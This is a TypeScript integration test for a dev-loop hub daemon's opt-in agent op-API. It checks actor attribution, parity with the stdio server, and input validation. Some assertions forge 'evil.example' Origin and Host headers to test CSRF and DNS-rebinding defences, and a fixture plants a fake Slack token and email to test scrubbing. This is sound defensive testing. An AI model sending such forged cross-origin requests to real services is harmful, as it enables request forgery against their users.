// DL-43 — the opt-in daemon agent op-API (/api/op/*). Seeds a project through the REAL stdio MCP write
// path, starts a WRITABLE daemon in-process, and asserts: the mount is DORMANT (404) until the project opts
// in via settings_json.hub.transport==="daemon"; the 5 core ops mirror the stdio server; a write lands
// ATTRIBUTED to the X-Devloop-Actor header (confirmed via list_events on the stdio path — cross-path
// consistency); the full endpoint pipeline (CSRF/foreign-Host → unknown/missing actor → dry-run mode gate)
// refuses correctly; and the existing read/roadmap surfaces stay byte-for-byte unchanged through every toggle.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { once } from "node:events";
import { request as httpRequest } from "node:http";
import { openDb } from "../src/db.ts";
import { findProject } from "../src/seed.ts";
import { createDaemon } from "../src/daemon.ts";

const DB = "/tmp/hub-agent-api/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// seed the project + actors (ensureActors runs inside seed.ts → dev/qa/pm/operator all exist; "ghost" does not)
execFileSync("node", ["src/seed.ts", "agp", "AgentAPI Project", "AGP", DB], { encoding: "utf8" });

// ─── seed one ticket through the real stdio MCP write path (the daemon must read what agents wrote) ───
async function as(actor: string, project = "agp"): Promise<Client> { // project: the D1 matrix needs stdio clients booted into a sibling ("agp2") and the steward home ("_team")
  const c = new Client({ name: `aaptest-${actor}`, version: "0.0.0" });
  await c.connect(new StdioClientTransport({
    command: "node", args: ["src/server.ts"],
    env: { ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: project, DEVLOOP_HUB_DB: DB },
  }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown>): Promise<any> {
  const r: any = await c.callTool({ name, arguments: args });
  const text = r.content?.[0]?.text ?? "{}";
  if (r.isError) throw new Error(`${name} failed: ${text}`);
  return JSON.parse(text);
}
const pm = await as("pm");
const feat = await call(pm, "save_issue", { title: "Seed feature", type: "Feature", labels: ["dev-loop", "Feature", "pm"], priority: 2 });
const verifier = await as("dev"); // an MCP client on the stdio path → list_events / get_issue for cross-path checks

// ─── start a WRITABLE daemon in-process (read conn query_only; write conn for the op-API writes) ───
const rdb = openDb(DB); rdb.exec("PRAGMA query_only=ON");
const wdb = openDb(DB);
const projectId = findProject(rdb, "agp")!;
const server = createDaemon({ db: rdb, projectId, projectKey: "agp", writeDb: wdb, actor: "operator" });
server.listen(0, "127.0.0.1");
await once(server, "listening");
const port = (server.address() as { port: number }).port;
const base = `http://127.0.0.1:${port}`;

// op-API call over node:http so we can forge X-Devloop-Actor / Origin / Host (fetch forbids the latter two).
function op(name: string, args: Record<string, unknown>, headers: Record<string, string> = {}): Promise<{ status: number; body: any }> {
  const body = JSON.stringify(args ?? {});
  return new Promise((resolve, reject) => {
    const r = httpRequest({ hostname: "127.0.0.1", port, method: "POST", path: `/api/op/${name}`,
      headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body), ...headers } },
      (res) => { let d = ""; res.setEncoding("utf8"); res.on("data", (c) => (d += c)); res.on("end", () => { let b: any; try { b = JSON.parse(d); } catch { b = null; } resolve({ status: res.statusCode ?? 0, body: b }); }); });
    r.on("error", reject); r.end(body);
  });
}
const DEV = { "x-devloop-actor": "dev" }, QA = { "x-devloop-actor": "qa" }, OPER = { "x-devloop-actor": "operator" };
async function getJson(path: string): Promise<{ status: number; body: any }> {
  const r = await fetch(base + path); let b: any; try { b = await r.json(); } catch { b = null; } return { status: r.status, body: b };
}
const eventsBy = async (actor: string, kind: string, ticketId: string): Promise<boolean> =>
  (await call(verifier, "list_events", { limit: 200 })).some((e: any) => e.actor === actor && e.kind === kind && e.ticket_id === ticketId);
const eventsByKind = async (actor: string, kind: string): Promise<boolean> => // channel/doc events carry no ticket_id
  (await call(verifier, "list_events", { limit: 200 })).some((e: any) => e.actor === actor && e.kind === kind);

// ═══ DORMANT by default — settings_json.hub.transport unset ⇒ every /api/op/* path 404s ═══════════════
ok((await op("save_issue", { title: "x" }, DEV)).status === 404, "flag-off: POST /api/op/save_issue → 404 (mount dormant, no hub.transport)");
ok((await op("list_issues", {}, DEV)).status === 404, "flag-off: POST /api/op/list_issues → 404 (reads dormant too)");
// DL-62: the widened doc/event ops are dormant too while the flag is off (default-off, zero new surface)
ok((await op("doc.list", {}, DEV)).status === 404, "flag-off: POST /api/op/doc.list → 404 (doc reads dormant too)");
ok((await op("doc.save", { slug: "x", kind: "strategy", body: "y", baseVersion: 0 }, { "x-devloop-actor": "pm" })).status === 404, "flag-off: POST /api/op/doc.save → 404 (doc writes dormant too)");
ok((await op("list_events", {}, DEV)).status === 404, "flag-off: POST /api/op/list_events → 404 (events dormant too)");
// DL-67: the channel family is dormant too while the flag is off (default-off, zero new surface)
ok((await op("channel.status", {}, DEV)).status === 404, "flag-off: POST /api/op/channel.status → 404 (channel reads dormant too)");
ok((await op("channel.register", { provider: "slack", configRef: "X", channelRef: "C" }, { "x-devloop-actor": "pm" })).status === 404, "flag-off: POST /api/op/channel.register → 404 (channel writes dormant too)");
// DL-68: the P7 mirror + label/project family is dormant too while the flag is off (default-off, zero new surface)
ok((await op("mirror.status", {}, DEV)).status === 404, "flag-off: POST /api/op/mirror.status → 404 (mirror reads dormant too)");
ok((await op("mirror.push", { teamId: "t", tokenEnv: "DEVLOOP_LINEAR_TOKEN" }, DEV)).status === 404, "flag-off: POST /api/op/mirror.push → 404 (mirror writes dormant too)");
ok((await op("list_issue_labels", {}, DEV)).status === 404, "flag-off: POST /api/op/list_issue_labels → 404 (label reads dormant too)");
ok((await op("create_issue_label", { name: "x", kind: "marker" }, { "x-devloop-actor": "pm" })).status === 404, "flag-off: POST /api/op/create_issue_label → 404 (label writes dormant too)");
ok((await op("get_project", {}, DEV)).status === 404, "flag-off: POST /api/op/get_project → 404 (project read dormant too)");
// the existing read + roadmap surfaces are byte-for-byte unchanged while the op-API is dormant
const tBefore = await getJson("/api/tickets");
ok(tBefore.status === 200 && tBefore.body.length === 1 && tBefore.body[0].id === feat.id, "flag-off: GET /api/tickets unchanged (the read surface still serves)");
ok((await fetch(base + "/")).status === 200, "flag-off: GET / (board) unchanged");
ok((await fetch(base + "/roadmap")).status === 200, "flag-off: GET /roadmap unchanged");

// ═══ opt in: settings_json.hub.transport = "daemon" (read FRESH per request — no restart) ═════════════
const setTransport = (on: boolean) => { const s = openDb(DB); s.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify(on ? { hub: { transport: "daemon" } } : {}), projectId); s.close(); };
const setMode = (mode: string) => { const s = openDb(DB); s.prepare("UPDATE projects SET mode=? WHERE id=?").run(mode, projectId); s.close(); };
setTransport(true);

// ── reads via the op-API mirror the stdio server ──
const li = await op("list_issues", {}, DEV);
ok(li.status === 200 && Array.isArray(li.body) && li.body.length === 1 && li.body[0].id === feat.id, "flag-on: op list_issues → the seeded ticket (mirrors stdio list_issues)");
const liFilt = await op("list_issues", { type: "Bug" }, DEV);
ok(liFilt.status === 200 && liFilt.body.length === 0, "flag-on: op list_issues?type=Bug → filtered (no bugs yet)");
const gi = await op("get_issue", { id: feat.id }, DEV);
ok(gi.status === 200 && gi.body.id === feat.id && Array.isArray(gi.body.comments), "flag-on: op get_issue → the ticket + its comments");

// ── save_comment lands ATTRIBUTED to X-Devloop-Actor (the headline win) ──
const sc = await op("save_comment", { issueId: feat.id, body: "via the op-API as dev" }, DEV);
ok(sc.status === 200 && sc.body.author === "dev" && sc.body.ticket_id === feat.id, "op save_comment (X-Devloop-Actor: dev) → 200, authored by dev");
const giAfter = await call(verifier, "get_issue", { id: feat.id }); // confirm on the STDIO path (cross-path consistency)
ok(giAfter.comments.some((c: any) => c.author === "dev" && c.body === "via the op-API as dev"), "the op-API comment is visible on the stdio path, attributed to dev");
ok(await eventsBy("dev", "comment.add", feat.id), "list_events confirms a comment.add attributed to dev (the X-Devloop-Actor actor)");

// ── save_issue CREATE attributed to a DIFFERENT actor (qa) — multiplexing N agents over one writer ──
const created = await op("save_issue", { title: "Op-filed bug", type: "Bug", labels: ["dev-loop", "Bug", "qa"], priority: 1 }, QA);
ok(created.status === 200 && created.body.created_by === "qa" && created.body.type === "Bug" && created.body.state === "Todo", "op save_issue create (X-Devloop-Actor: qa) → 200, created_by qa, Todo");
const bugId = created.body.id;
ok(await eventsBy("qa", "issue.create", bugId), "list_events confirms issue.create attributed to qa");

// ── save_issue UPDATE: assignee "me" resolves to the HEADER actor; a real transition is attributed ──
const upd = await op("save_issue", { id: feat.id, assignee: "me", state: "In Progress" }, DEV);
ok(upd.status === 200 && upd.body.assignee === "dev" && upd.body.state === "In Progress", `op save_issue update assignee:"me" → resolves to the header actor (dev); state moved (got assignee=${upd.body.assignee})`);
ok(await eventsBy("dev", "issue.transition", feat.id), "list_events confirms issue.transition attributed to dev");
// REPLACE-style labels + APPEND-only relatedTo parity with the stdio server
await op("save_issue", { id: feat.id, labels: ["dev-loop", "Feature", "pm", "x1"], relatedTo: [bugId] }, DEV);
const rel1 = await call(verifier, "get_issue", { id: feat.id });
ok(rel1.labels.includes("x1") && !rel1.labels.includes("env:dev") && rel1.relatedTo.includes(bugId), "op save_issue: labels REPLACE (x1 added) + relatedTo APPEND (bug linked)");
await op("save_issue", { id: feat.id, relatedTo: ["AGP-zzz"] }, DEV); // append a 2nd, the 1st must survive (union)
const rel2 = await call(verifier, "get_issue", { id: feat.id });
ok(rel2.relatedTo.includes(bugId) && rel2.relatedTo.includes("AGP-zzz"), "op save_issue: relatedTo is APPEND-only (the prior link survives a 2nd add)");

// ── list_comments via the op-API ──
const lc = await op("list_comments", { issueId: feat.id }, DEV);
ok(lc.status === 200 && Array.isArray(lc.body) && lc.body.some((c: any) => c.author === "dev"), "op list_comments → the dev-authored comment");

// ═══ DL-62: the doc/event family via the op-API (mirrors server.ts list_events + doc.*) ════════════════
// list_events — the attribution feed (Reflect's window) already holds the attributed writes above; byte-parity with stdio
const ev = await op("list_events", { limit: 200 }, DEV);
const evStdio = await call(verifier, "list_events", { limit: 200 });
ok(ev.status === 200 && Array.isArray(ev.body) && ev.body.some((e: any) => e.actor === "qa" && e.kind === "issue.create"), "op list_events → the attributed feed (qa issue.create present)");
ok(JSON.stringify(ev.body) === JSON.stringify(evStdio), "parity: op list_events ≡ stdio list_events (byte-identical)");

// doc.save (CREATE) attributed to X-Devloop-Actor (pm), a DRAFT via the CAS — never auto-published
const ds = await op("doc.save", { slug: "strat", kind: "strategy", title: "Strategy", body: "v1 body", baseVersion: 0 }, { "x-devloop-actor": "pm" });
ok(ds.status === 200 && ds.body.version === 1 && ds.body.status === "draft", `op doc.save (new) → draft v1 (got ${JSON.stringify(ds.body)})`);
ok((await call(verifier, "doc.history", { slug: "strat" }))[0].author === "pm", "doc.save landed attributed to pm (doc.history on the stdio path — cross-path attribution)");
ok((await call(verifier, "list_events", { limit: 50 })).some((e: any) => e.actor === "pm" && e.kind === "doc.save"), "list_events confirms a doc.save attributed to pm");

// reads mirror the stdio server byte-for-byte
const dg = await op("doc.get", { slug: "strat" }, DEV);
ok(dg.status === 200 && JSON.stringify(dg.body) === JSON.stringify(await call(verifier, "doc.get", { slug: "strat" })) && dg.body.unpublished === true, "parity: op doc.get ≡ stdio doc.get (unpublished draft)");
const dlOp = await op("doc.list", {}, DEV);
ok(dlOp.status === 200 && JSON.stringify(dlOp.body) === JSON.stringify(await call(verifier, "doc.list", {})), "parity: op doc.list ≡ stdio doc.list");
ok(JSON.stringify((await op("doc.history", { slug: "strat" }, DEV)).body) === JSON.stringify(await call(verifier, "doc.history", { slug: "strat" })), "parity: op doc.history ≡ stdio doc.history");

// CAS: a stale baseVersion → 409 CONFLICT (never last-write-wins); a kind-clash at an existing slug → 409 (kind immutable)
const stale = await op("doc.save", { slug: "strat", kind: "strategy", body: "racey", baseVersion: 0 }, { "x-devloop-actor": "pm" });
ok(stale.status === 409 && /CONFLICT/.test(stale.body.error), `op doc.save stale base → 409 CONFLICT (got ${stale.status} ${JSON.stringify(stale.body)})`);
ok((await op("doc.save", { slug: "strat", kind: "notes", body: "x", baseVersion: 1 }, { "x-devloop-actor": "pm" })).status === 409, "op doc.save with a mismatched kind at an existing slug → 409 (a doc's kind is immutable)");

// append a real v2, then doc.diff parity (unified diff over the version bodies)
await op("doc.save", { slug: "strat", kind: "strategy", body: "v2 body", baseVersion: 1 }, { "x-devloop-actor": "pm" });
const diff = await op("doc.diff", { slug: "strat", from: 1, to: 2 }, DEV);
ok(diff.status === 200 && JSON.stringify(diff.body) === JSON.stringify(await call(verifier, "doc.diff", { slug: "strat", from: 1, to: 2 })) && /v1 body/.test(diff.body.fromBody) && /v2 body/.test(diff.body.toBody), "parity: op doc.diff ≡ stdio doc.diff (unified diff over version bodies)");

// operator-publish gate (cooperative role-attribution, §18): a non-operator → 403; the operator → 200 current
const pubByPm = await op("doc.publish", { slug: "strat", version: 2 }, { "x-devloop-actor": "pm" });
ok(pubByPm.status === 403 && /only the operator/.test(pubByPm.body.error), `op doc.publish as pm → 403 (cooperative operator gate; got ${pubByPm.status})`);
const pub = await op("doc.publish", { slug: "strat", version: 2 }, { "x-devloop-actor": "operator" });
ok(pub.status === 200 && pub.body.status === "current" && pub.body.current_version === 2, `op doc.publish as operator → v2 current (got ${JSON.stringify(pub.body)})`);

// doc guards: a ghost slug → 404; a missing version to publish → 404; invalid kind → 400; the CSRF/rebind wall covers doc writes
ok((await op("doc.get", { slug: "nope" }, DEV)).status === 404, "guard: doc.get of a ghost slug → 404");
ok((await op("doc.publish", { slug: "strat", version: 99 }, { "x-devloop-actor": "operator" })).status === 404, "guard: doc.publish of a missing version → 404");
ok((await op("doc.save", { slug: "bad", kind: "bogus", body: "y", baseVersion: 0 }, { "x-devloop-actor": "pm" })).status === 400, "guard: doc.save invalid kind → 400 (mirrors the zod DOC_KINDS enum)");
// the op-API parses raw JSON (no zod) → numeric/string inputs are re-validated by hand to mirror server.ts's schema (a clean 400, never a node:sqlite bind-throw 500 or a synthetic success)
ok((await op("list_events", { limit: "all" }, DEV)).status === 400, "guard: list_events non-integer limit → 400 (not a 500 from a bad LIMIT bind)");
ok((await op("list_events", { limit: 10000 }, DEV)).status === 400, "guard: list_events limit over the cap → 400 (mirrors zod .max(500))");
ok((await op("doc.get", { slug: "strat", version: 0 }, DEV)).status === 400, "guard: doc.get version:0 → 400 (mirrors zod .positive(), not a synthetic empty-doc 200)");
ok((await op("doc.save", { slug: "strat", kind: "strategy", body: "z", baseVersion: 2, title: {} }, { "x-devloop-actor": "pm" })).status === 400, "guard: doc.save non-string title → 400 (not a 500 from an object bound into the INSERT)");
// DL-63: the doc READ handlers re-check slug/kind as strings too (the write path + server.ts zod already do).
// A non-string slug/kind would otherwise bind into resolveDoc and node:sqlite throws → an HTTP 500 echoing the
// raw driver string; each read selector must return a clean 400 (the parity gap DL-62 left on the read path).
ok((await op("doc.get", { slug: {} }, DEV)).status === 400, "guard: doc.get non-string slug → 400 (not a 500 from a node:sqlite bind-throw)");
ok((await op("doc.get", { kind: {} }, DEV)).status === 400, "guard: doc.get non-string kind → 400");
ok((await op("doc.history", { slug: [1] }, DEV)).status === 400, "guard: doc.history non-string slug → 400");
ok((await op("doc.diff", { slug: {}, from: 1, to: 2 }, DEV)).status === 400, "guard: doc.diff non-string slug → 400 (not a bind-throw 500)");
ok((await op("doc.list", { kind: {} }, DEV)).status === 400, "guard: doc.list non-string kind → 400");
// AC #2: the 400 body is a clean message, never the raw node:sqlite "Provided value cannot be bound…" string
const dgBadSlug = await op("doc.get", { slug: {} }, DEV);
ok(dgBadSlug.status === 400 && !/cannot be bound/i.test(JSON.stringify(dgBadSlug.body)), "doc.get non-string slug: a clean 400 body, not the raw 'Provided value cannot be bound' driver string");
ok((await op("doc.save", { slug: "strat", kind: "strategy", body: "csrf", baseVersion: 2 }, { "x-devloop-actor": "pm", origin: "http://evil.example" })).status === 403, "guard: cross-origin doc.save → 403 (CSRF wall covers the doc write)");
ok((await op("doc.publish", { slug: "strat", version: 1 }, { "x-devloop-actor": "operator", host: "evil.example" })).status === 403, "guard: foreign Host doc.publish → 403 (DNS-rebinding wall)");

// ═══ DL-67: the IM channel family via the op-API (mirrors server.ts channel.*; DRYRUN = build-no-network) ══
// no channel yet → channel.send/poll return the clear "register first" error as a clean 400 (never a 500)
const chPre = await op("channel.send", { kind: "reply", text: "x" }, DEV);
ok(chPre.status === 400 && /channel\.register first/.test(chPre.body.error), `op channel.send with no channel → clean 400 "register first" (got ${chPre.status} ${JSON.stringify(chPre.body)})`);
ok((await op("channel.poll", {}, DEV)).status === 400, "op channel.poll with no channel → 400 (register first, not a 500)");
ok((await op("channel.status", {}, DEV)).body.configured === false, "op channel.status before register → configured:false");
// channel.register (write) attributed to the X-Devloop-Actor (dev); §16 rejects a literal token where an env-NAME belongs
const chReg = await op("channel.register", { provider: "slack", configRef: "DEVLOOP_CHANNEL_TOKEN", channelRef: "C-OP" }, DEV);
ok(chReg.status === 200 && chReg.body.provider === "slack" && chReg.body.channelRef === "C-OP", `op channel.register (X-Devloop-Actor: dev) → stored (got ${JSON.stringify(chReg.body)})`);
ok(await eventsByKind("dev", "channel.register"), "list_events confirms channel.register attributed to dev (the identity win, channel family)");
ok((await op("channel.register", { provider: "slack", configRef: "xoxb-LITERAL-SECRET", channelRef: "C9" }, DEV)).status === 400, "op channel.register rejects a literal token in configRef → 400 (env NAMES only; no secret reaches the DB)");
// channel.status (read; query_only) → NAMES + set-flags, never the token; differential parity vs the stdio server
const chSt = await op("channel.status", {}, DEV);
ok(chSt.status === 200 && chSt.body.configured === true && chSt.body.configRefSet === true && !JSON.stringify(chSt.body).includes("xoxb-"), "op channel.status → configured + configRefSet boolean, never the token value (§16)");
ok(JSON.stringify(chSt.body) === JSON.stringify(await call(verifier, "channel.status", {})), "parity: op channel.status ≡ stdio channel.status (byte-identical)");
// channel.send notify (DRYRUN: built §16 allow-listed lines, no network) attributed to dev
const chSend = await op("channel.send", { kind: "notify", ticketId: feat.id, bailShape: "decision-needed" }, DEV);
ok(chSend.status === 200 && chSend.body.dryrun === true && chSend.body.lines.join(" ").includes(feat.id) && chSend.body.lines.join(" ").includes("decision-needed"), `op channel.send notify (dryrun) → built line carries ticket id + bail-shape (got ${JSON.stringify(chSend.body.lines)})`);
ok(await eventsByKind("dev", "channel.send"), "list_events confirms channel.send attributed to dev");
// the DL-4 roadmap-over-chat bridge over the op-API: publish a roadmap, poll a fixture (a `roadmap` summary + an edit→DRAFT + a normal msg), NEVER auto-publish
await op("doc.save", { slug: "roadmap", kind: "roadmap", title: "Roadmap", body: "# Roadmap\n- ship the op-API channel\n", baseVersion: 0 }, OPER);
await op("doc.publish", { kind: "roadmap", version: 1 }, OPER);
process.env.DEVLOOP_CHANNEL_FIXTURE = JSON.stringify([
  { providerMsgId: "900.1", authorRef: "U1", text: "roadmap", providerTs: "900.1" },
  { providerMsgId: "900.2", authorRef: "U1", text: "roadmap edit # Roadmap v2\n- then mirror\nleak xoxb-LEAKED ping me@evil.com", providerTs: "900.2" },
  { providerMsgId: "900.3", authorRef: "U1", text: "what about mobile?", providerTs: "900.3" },
]);
const chPoll = await op("channel.poll", {}, DEV);
delete process.env.DEVLOOP_CHANNEL_FIXTURE;
ok(chPoll.status === 200 && chPoll.body.new === 3 && chPoll.body.roadmapHandled.length === 2, `op channel.poll → ingests 3, auto-handles 2 roadmap cmds (got new=${chPoll.body.new}, handled=${chPoll.body.roadmapHandled?.length})`);
const chSumm = chPoll.body.roadmapHandled.find((h: any) => h.type === "summary");
ok(!!chSumm && chSumm.lines.join(" ").includes("published v1"), "op channel.poll DL-4 bridge → a `roadmap` request → a summary reply showing the published version");
const chEdit = chPoll.body.roadmapHandled.find((h: any) => h.type === "edit");
ok(!!chEdit && /draft v2/.test(chEdit.result), "op channel.poll DL-4 bridge → a `roadmap edit` → a DRAFT v2 (doc.save)");
ok((await op("doc.get", { kind: "roadmap" }, DEV)).body.current_version === 1, "op channel.poll DL-4 bridge → the chat edit did NOT publish (current stays v1; the operator-publish firewall holds on the op-API path)");
const rmV2 = await op("doc.get", { kind: "roadmap", version: 2 }, DEV);
ok(rmV2.body.body.includes("then mirror") && !rmV2.body.body.includes("xoxb-LEAKED") && !rmV2.body.body.includes("me@evil.com") && rmV2.body.body.includes("***"), "op channel.poll DL-4 bridge → the draft is persisted but secrets + PII scrubbed (§16)");
ok(chPoll.body.pending.some((p: any) => p.text.includes("mobile")), "op channel.poll → a non-command msg stays pending for the Director");
// channel.ack (write) attributed to dev; non-string args → clean 400 (DL-63); the CSRF wall covers a channel write
const chAckId = chPoll.body.pending[0].messageId;
ok((await op("channel.ack", { messageId: chAckId, actedInto: "AGP-x" }, DEV)).body.acted === true, "op channel.ack → marks the message consumed");
ok(await eventsByKind("dev", "channel.ack"), "list_events confirms channel.ack attributed to dev");
ok((await op("channel.send", { kind: "notify", ticketId: {} }, DEV)).status === 400, "op channel.send non-string ticketId → 400 (not a node:sqlite bind 500; DL-63 lesson)");
ok((await op("channel.ack", { messageId: 5 }, DEV)).status === 400, "op channel.ack non-string messageId → 400");
ok((await op("channel.register", { provider: "bogus", configRef: "X", channelRef: "C" }, DEV)).status === 400, "op channel.register invalid provider → 400");
ok((await op("channel.register", { provider: "slack", configRef: "DEVLOOP_CHANNEL_TOKEN", channelRef: "C2" }, { ...DEV, origin: "http://evil.example" })).status === 403, "op channel.register cross-origin → 403 (CSRF/DNS-rebind wall covers the channel write)");

// ═══ DL-68: the P7 mirror + label/project family via the op-API (mirrors server.ts; mirror.push DRYRUN = build-no-network) ══
// reads mirror the stdio server byte-for-byte (the differential-parity AC)
const llOp = await op("list_issue_labels", {}, DEV);
ok(llOp.status === 200 && JSON.stringify(llOp.body) === JSON.stringify(await call(verifier, "list_issue_labels", {})), "parity: op list_issue_labels ≡ stdio list_issue_labels (byte-identical)");
const gpOp = await op("get_project", {}, DEV);
ok(gpOp.status === 200 && JSON.stringify(gpOp.body) === JSON.stringify(await call(verifier, "get_project", {})) && gpOp.body.key === "agp", "parity: op get_project ≡ stdio get_project (byte-identical)");
const msOp = await op("mirror.status", {}, DEV);
ok(msOp.status === 200 && JSON.stringify(msOp.body) === JSON.stringify(await call(verifier, "mirror.status", {})), "parity: op mirror.status ≡ stdio mirror.status (byte-identical)");
// create_issue_label (write) attributed to dev via X-Devloop-Actor; the label appears on the stdio path; DL-22 holds
const clOp = await op("create_issue_label", { name: "op-made-label", kind: "subtype" }, DEV);
ok(clOp.status === 200 && clOp.body.name === "op-made-label" && clOp.body.kind === "subtype", `op create_issue_label → 200 {name,kind} (got ${JSON.stringify(clOp.body)})`);
ok(await eventsByKind("dev", "label.create"), "list_events confirms label.create attributed to dev (the identity win, label family)");
ok((await call(verifier, "list_issue_labels", {})).some((l: any) => l.name === "op-made-label"), "the op-API-created label is visible on the stdio path (one db)");
ok((await op("create_issue_label", { name: "ghostkind", kind: "bogus-kind" }, DEV)).status === 400, "DL-22: op create_issue_label bad kind → clean 400 (not a fake success)");
ok(!(await call(verifier, "list_issue_labels", {})).some((l: any) => l.name === "ghostkind"), "DL-22: the bad-kind label was NOT created on the op-API path (no dropped-row masquerade)");
ok((await op("create_issue_label", { name: "   " }, DEV)).status === 400, "DL-22: op create_issue_label whitespace-only name → clean 400 (no junk row)");
ok((await op("create_issue_label", { name: 5 }, DEV)).status === 400, "op create_issue_label non-string name → 400 (DL-63 hand-validation, not a 500)");
ok((await op("create_issue_label", { name: "op-made-label", kind: "subtype" }, DEV)).status === 200, "op create_issue_label re-create → 200 (idempotent on UNIQUE(project,name))");
ok((await call(verifier, "list_issue_labels", {})).filter((l: any) => l.name === "op-made-label").length === 1, "idempotent: exactly one 'op-made-label' row");
// mirror.push (write, DRYRUN: build-no-network) attributed to dev → previews ops, persists NO mirror_map row (DL-11)
const mpOp = await op("mirror.push", { teamId: "team_1", tokenEnv: "DEVLOOP_LINEAR_TOKEN" }, DEV);
ok(mpOp.status === 200 && mpOp.body.dryrun === true && Array.isArray(mpOp.body.ops) && mpOp.body.ops.length >= 1, `op mirror.push (DRYRUN) → previews would-push ops, dryrun:true (got created=${mpOp.body.created}, ops=${mpOp.body.ops?.length})`);
ok(mpOp.body.ops.every((o: any) => o.title.includes("[hub:") && o.body.includes("Mirrored from the dev-loop hub")), "op mirror.push DRYRUN ops carry the [hub:id] marker + split-brain banner");
ok(await eventsByKind("dev", "mirror.push"), "list_events confirms mirror.push attributed to dev (the identity win, mirror family)");
ok((await op("mirror.status", {}, DEV)).body.mapped === 0, "DL-11: after a DRYRUN op mirror.push, mirror_map is still EMPTY (mapped:0 — no poisoned row persisted)");
ok((await op("mirror.push", { teamId: "t", tokenEnv: "lin_api_LITERALSECRET" }, DEV)).status === 400, "§16: op mirror.push rejects a literal token in tokenEnv → 400 (env NAMES only, no secret to the DB)");
ok((await op("mirror.push", { teamId: 5, tokenEnv: "DEVLOOP_LINEAR_TOKEN" }, DEV)).status === 400, "op mirror.push non-string teamId → 400 (DL-63 hand-validation, not a node:sqlite bind 500)");
ok((await op("mirror.push", { teamId: "t", tokenEnv: "DEVLOOP_LINEAR_TOKEN", stateMap: "x" }, DEV)).status === 400, "op mirror.push non-object stateMap → 400");
ok((await op("mirror.push", { teamId: "t", tokenEnv: "DEVLOOP_LINEAR_TOKEN", limit: 0 }, DEV)).status === 400, "op mirror.push out-of-range limit → 400 (mirrors zod 1..500)");
// the CSRF/DNS-rebind wall covers the 2 new writes (the design-#4 guard order applies to the new endpoints too)
ok((await op("create_issue_label", { name: "csrf-label" }, { ...DEV, origin: "http://evil.example" })).status === 403, "op create_issue_label cross-origin → 403 (CSRF/DNS-rebind wall covers the new label write)");
ok((await op("mirror.push", { teamId: "t", tokenEnv: "DEVLOOP_LINEAR_TOKEN" }, { ...DEV, origin: "http://evil.example" })).status === 403, "op mirror.push cross-origin → 403 (CSRF/DNS-rebind wall covers the new mirror write)");

// ═══ endpoint pipeline guards ═════════════════════════════════════════════════════════════════════════
ok((await op("save_comment", { issueId: feat.id, body: "no actor" }, {})).status === 400, "guard: missing X-Devloop-Actor → 400");
ok((await op("save_comment", { issueId: feat.id, body: "ghost" }, { "x-devloop-actor": "ghost" })).status === 400, "guard: unknown actor 'ghost' → 400 (G1 phantom-actor guard)");
ok((await op("save_comment", { issueId: feat.id, body: "csrf" }, { ...DEV, origin: "http://evil.example" })).status === 403, "guard: cross-origin Origin → 403 (CSRF wall)");
ok((await op("save_comment", { issueId: feat.id, body: "rebind" }, { ...DEV, host: "evil.example" })).status === 403, "guard: foreign Host → 403 (DNS-rebinding wall)");
ok((await op("get_issue", { id: "AGP-999" }, DEV)).status === 404, "guard: get_issue of a ghost → 404");
ok((await op("save_issue", { id: "AGP-999", state: "Done" }, DEV)).status === 404, "guard: update of a missing ticket → 404");
ok((await op("save_issue", { id: feat.id, state: "Bogus" }, DEV)).status === 400, "guard: invalid state → 400 (mirrors the STATES CHECK)");
ok((await op("save_issue", { id: feat.id, assignee: "ghost" }, DEV)).status === 400, "guard: unknown assignee → 400");
ok((await op("save_issue", {}, DEV)).status === 400, "guard: create with no title → 400");
// input-shape guards (the stdio path gets these from zod; the op-API re-checks by hand). A non-array
// labels would otherwise be stored non-array and crash a later list_issues label filter (500 poison-pill).
ok((await op("save_issue", { id: feat.id, labels: "Bug" }, DEV)).status === 400, "guard: non-array labels → 400 (poison-pill prevented)");
ok((await op("save_issue", { id: feat.id, relatedTo: "AGP-1" }, DEV)).status === 400, "guard: non-array relatedTo → 400");
ok((await op("save_issue", { title: "p", priority: 9 }, DEV)).status === 400, "guard: out-of-range priority → 400 (mirrors zod int 0..4)");
// DL-65: the last unguarded READ op — list_issues re-checks query/labels/assignee as the right types (server.ts
// zod: query/assignee z.string().optional(), labels z.array(z.string()).optional()). A non-string query
// (.toLowerCase()), a non-array labels (the [...] spread), or a non-string assignee (resolveAssignee→.trim())
// would otherwise throw a TypeError → the daemon's catch → an HTTP 500 echoing the raw JS error; each must 400.
ok((await op("list_issues", { query: {} }, DEV)).status === 400, "guard: list_issues non-string query → 400 (not a 500 from .toLowerCase on a non-string)");
ok((await op("list_issues", { query: 5 }, DEV)).status === 400, "guard: list_issues numeric query → 400");
ok((await op("list_issues", { labels: 5 }, DEV)).status === 400, "guard: list_issues non-array labels → 400 (not a 500 from the [...] spread)");
ok((await op("list_issues", { labels: {} }, DEV)).status === 400, "guard: list_issues non-iterable labels → 400");
ok((await op("list_issues", { assignee: {} }, DEV)).status === 400, "guard: list_issues non-string assignee → 400 (not a 500 from resolveAssignee.trim())");
// AC #2: the 400 body is a clean message, never the raw JS TypeError string
const liBadQuery = await op("list_issues", { query: {} }, DEV);
ok(liBadQuery.status === 400 && !/toLowerCase is not a function/i.test(JSON.stringify(liBadQuery.body)), "list_issues non-string query: a clean 400 body, not the raw 'toLowerCase is not a function' TypeError");
// AC #3: well-formed + absent inputs unchanged — a valid string query / array labels / string assignee still 200
ok((await op("list_issues", { query: "seed" }, DEV)).status === 200, "list_issues valid string query → 200 (unchanged)");
ok((await op("list_issues", { labels: ["dev-loop"] }, DEV)).status === 200, "list_issues valid array labels → 200 (unchanged)");
ok((await op("list_issues", { assignee: "dev" }, DEV)).status === 200, "list_issues valid string assignee → 200 (unchanged)");
// reads still serve after the rejected poison-pill writes (no corrupt labels landed → no 500)
ok((await op("list_issues", { label: "pm" }, DEV)).status === 200, "post-guard: list_issues?label=pm still 200 (no corrupt labels row poisoned the filter)");
